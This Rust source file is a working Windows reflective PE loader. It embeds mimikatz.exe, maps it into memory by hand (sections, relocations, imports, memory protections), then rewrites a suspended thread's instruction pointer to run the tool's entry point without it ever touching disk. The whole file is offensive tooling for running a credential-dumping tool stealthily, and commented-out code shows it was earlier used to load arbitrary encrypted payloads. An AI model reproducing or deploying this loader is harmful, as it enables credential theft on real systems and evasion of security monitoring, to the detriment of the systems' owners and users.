#![allow(deprecated, unused_assignments)]
use std::{
    fs::File, intrinsics::copy_nonoverlapping, io::Read, mem::zeroed, os::raw::c_void,
    process::exit, ptr::null_mut, str::from_utf8, sync::OnceLock,
};

use windows_sys::Win32::{
    Foundation::{DUPLICATE_SAME_ACCESS, DuplicateHandle},
    System::{
        Diagnostics::Debug::{
            CONTEXT, CONTEXT_FULL_AMD64, GetThreadContext, IMAGE_DIRECTORY_ENTRY_BASERELOC,
            IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_NT_HEADERS64, IMAGE_SCN_MEM_EXECUTE,
            IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE, IMAGE_SECTION_HEADER, SetThreadContext,
        },
        LibraryLoader::{GetProcAddress, LoadLibraryA},
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
            PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
            PAGE_WRITECOPY, VirtualAlloc, VirtualProtect,
        },
        SystemServices::{
            IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_IMPORT_BY_NAME,
            IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_SIGNATURE,
        },
        Threading::{
            CreateThread, GetCurrentProcess, GetCurrentThread, ResumeThread, SuspendThread,
            WaitForSingleObject,
        },
        WindowsProgramming::IMAGE_THUNK_DATA64,
    },
};

static BUFFER: OnceLock<Vec<u8>> = OnceLock::new();

macro_rules! IMAGE_FIRST_SECTION {
    ($ntheader:expr) => {{
        let nt_hdr = $ntheader as *const IMAGE_NT_HEADERS64;
        let optional_header_ptr = std::ptr::addr_of!((*nt_hdr).OptionalHeader) as usize;
        let offset = (*nt_hdr).FileHeader.SizeOfOptionalHeader as usize;
        (optional_header_ptr + offset) as *const IMAGE_SECTION_HEADER
    }};
}

unsafe extern "system" fn run_me(param: *mut c_void) -> u32 {
    unsafe {
        let thread_handle = param as *mut c_void;

        SuspendThread(thread_handle);

        let buffer = BUFFER
            .get()
            .map(|b| b.as_ptr() as *const u8)
            .unwrap_or(null_mut());

        let _buf_len = BUFFER.get().map(|b| b.len()).unwrap_or(0);

        let dos_header = BUFFER
            .get()
            .map(|b| b.as_ptr() as *const u8)
            .unwrap_or(null_mut()) as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS signature");
            return 1;
        }

        let nt_header = buffer.add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT signature");
            return 1;
        }

        let image_size = (*nt_header).OptionalHeader.SizeOfImage as usize;
        let header_size = (*nt_header).OptionalHeader.SizeOfHeaders as usize;

        let image_base = VirtualAlloc(
            null_mut(),
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if image_base.is_null() {
            println!("[-] Failed to allocate memory for image");
            return 1;
        }

        copy_nonoverlapping(
            BUFFER.get().unwrap().as_ptr(),
            image_base as *mut u8,
            header_size as usize,
        );

        let sec_hdr = IMAGE_FIRST_SECTION!(nt_header);

        for i in 0..(*nt_header).FileHeader.NumberOfSections {
            let section = sec_hdr.add(i as usize);

            let name = from_utf8(&(*section).Name)
                .unwrap()
                .trim_matches(char::from(0));

            // println!("[+] Copying section: {} to memory", name);

            copy_nonoverlapping(
                BUFFER
                    .get()
                    .unwrap()
                    .as_ptr()
                    .add((*section).PointerToRawData as usize),
                (image_base as usize + (*section).VirtualAddress as usize) as *mut u8,
                (*section).SizeOfRawData as usize,
            );
        }

        let reloc_entry = (*nt_header).OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
            .VirtualAddress;

        let mut reloc_ptr =
            (image_base as usize + reloc_entry as usize) as *mut IMAGE_BASE_RELOCATION;
        let delta = image_base as isize - (*nt_header).OptionalHeader.ImageBase as isize;

        while (*reloc_ptr).VirtualAddress != 0 {
            if (*reloc_ptr).SizeOfBlock >= size_of::<IMAGE_BASE_RELOCATION>() as u32 {
                let entries =
                    ((*reloc_ptr).SizeOfBlock - size_of::<IMAGE_BASE_RELOCATION>() as u32) / 2;
                let rel_entry = reloc_ptr.add(1) as *const u16;

                for i in 0..entries {
                    if rel_entry.add(i as usize).read() != 0 {
                        let offset = rel_entry.add(i as usize).read() & 0xFFF;
                        let rtype = rel_entry.add(i as usize).read() >> 12;

                        if rtype == 0xA {
                            let patch_addr = (image_base as usize
                                + (*reloc_ptr).VirtualAddress as usize
                                + offset as usize)
                                as *mut usize;
                            patch_addr.write(patch_addr.read().wrapping_add(delta as usize));
                        }
                    }
                }
                reloc_ptr = (reloc_ptr as usize + (*reloc_ptr).SizeOfBlock as usize)
                    as *mut IMAGE_BASE_RELOCATION;
            }
        }

        let import_dir = (*nt_header).OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
            .VirtualAddress;

        let mut imp_desc =
            (image_base as usize + import_dir as usize) as *mut IMAGE_IMPORT_DESCRIPTOR;

        while (*imp_desc).Name != 0 {
            let dll_name = (image_base as usize + (*imp_desc).Name as usize) as *const i8;

            // println!(
            //     "[+] Loading DLL: {}",
            //     std::ffi::CStr::from_ptr(dll_name).to_str().unwrap()
            // );

            let h_module = LoadLibraryA(dll_name as *const u8);

            if h_module.is_null() {
                println!(
                    "[-] Failed to load {}",
                    std::ffi::CStr::from_ptr(dll_name).to_str().unwrap()
                );
                return 1;
            }

            // let p_names = match (*imp_desc).Anonymous.OriginalFirstThunk {
            //     0 => image_base as usize + (*imp_desc).FirstThunk as usize,
            //     _ => image_base as usize + (*imp_desc).Anonymous.OriginalFirstThunk as usize,
            // };

            let mut paddr =
                (image_base as usize + (*imp_desc).FirstThunk as usize) as *mut IMAGE_THUNK_DATA64;

            while (*paddr).u1.AddressOfData != 0 {
                let mut pfunc = 0 as u64;

                if (*paddr).u1.Ordinal & 0x8000000000000000 != 0 {
                    let ordinal = (*paddr).u1.Ordinal & 0xFFFF;
                    if let Some(func) = GetProcAddress(h_module, ordinal as *const u8) {
                        pfunc = func as u64;
                    }
                    // println!(
                    //     "    [+] Resolving function by ordinal: {} at address {:X}",
                    //     ordinal, pfunc
                    // );
                } else {
                    let imp_by_name = (image_base as usize + (*paddr).u1.AddressOfData as usize)
                        as *const IMAGE_IMPORT_BY_NAME;
                    let func_name =
                        std::ffi::CStr::from_ptr((*imp_by_name).Name.as_ptr() as *const i8)
                            .to_str()
                            .unwrap_or("Invalid UTF-8");
                    if let Some(func) = GetProcAddress(h_module, func_name.as_ptr() as *const u8) {
                        pfunc = func as u64;
                    }
                    // println!(
                    //     "    [+] Resolving function by name: {} at address {:X}",
                    //     func_name, pfunc
                    // );
                }

                (*paddr).u1.Function = pfunc;
                paddr = paddr.add(1);
            }

            imp_desc = imp_desc.add(1);
        }

        let num_sections = (*nt_header).FileHeader.NumberOfSections;

        for i in 0..num_sections {
            let sec = sec_hdr.add(i as usize);
            let virtual_addr = image_base as usize + (*sec).VirtualAddress as usize;
            let sec_size = if (*sec).Misc.VirtualSize != 0 {
                (*sec).Misc.VirtualSize as usize
            } else {
                (*sec).SizeOfRawData as usize
            };
            let mut protect = PAGE_READONLY;
            let mut old_protect = PAGE_PROTECTION_FLAGS::default();

            let chars = (*sec).Characteristics;
            let has_read = (chars & IMAGE_SCN_MEM_READ) != 0;
            let has_write = (chars & IMAGE_SCN_MEM_WRITE) != 0;
            let has_execute = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;

            protect = match (has_execute, has_write, has_read) {
                (true, true, true) => PAGE_EXECUTE_READWRITE,
                (true, true, false) => PAGE_EXECUTE_WRITECOPY,
                (true, false, true) => PAGE_EXECUTE_READ,
                (true, false, false) => PAGE_EXECUTE,
                (false, true, true) => PAGE_READWRITE,
                (false, true, false) => PAGE_WRITECOPY,
                (false, false, true) => PAGE_READONLY,
                (false, false, false) => PAGE_READONLY,
            };

            if sec_size > 0 {
                let _ = VirtualProtect(
                    virtual_addr as *const c_void,
                    sec_size,
                    protect,
                    &mut old_protect,
                );
            }
        }

        let mut ctx = zeroed::<CONTEXT>();
        ctx.ContextFlags = CONTEXT_FULL_AMD64;

        GetThreadContext(thread_handle, &mut ctx);

        ctx.Rip = image_base as u64 + (*nt_header).OptionalHeader.AddressOfEntryPoint as u64;

        SetThreadContext(thread_handle, &mut ctx);

        WaitForSingleObject(thread_handle, 1000);

        println!("[+] Resuming thread at entry point: 0x{:x}", ctx.Rip);
        ResumeThread(thread_handle);
    }

    0
}

fn main() {
    // let args: Vec<String> = std::env::args().collect();

    // if args.len() < 2 {
    //     println!("[+] Usage: {} proc.enc <arguments>", args[0]);
    //     exit(0);
    // }

    // let mut proc_args: Vec<String> = Vec::new();

    // if args.len() > 2 {
    //     proc_args = args[2..].to_vec();
    // }

    // let path = args[1].clone();

    // println!("[+] Executing: {} with arguments {:?}", path, proc_args);

    // let mut file = File::open(path).expect("Failed to open file");
    // let mut buffer = Vec::new();
    // file.read_to_end(&mut buffer).expect("Failed to read file");

    // BUFFER.set(buffer).expect("Failed to set buffer");

    let buffer = include_bytes!("../mimikatz.exe").to_vec();

    BUFFER.set(buffer).expect("Failed to set buffer");

    unsafe {
        let current_thread = GetCurrentThread();
        let mut dup_handle: *mut c_void = null_mut();

        if DuplicateHandle(
            GetCurrentProcess(),
            current_thread,
            GetCurrentProcess(),
            &mut dup_handle,
            0,
            0,
            DUPLICATE_SAME_ACCESS,
        ) == 0
        {
            println!("[-] Failed to duplicate handle");
            return;
        }

        let thread_handle = CreateThread(null_mut(), 0, Some(run_me), dup_handle, 0, null_mut());

        if thread_handle.is_null() {
            println!("[-] Failed to create thread");
            return;
        }

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        return;
    }
}
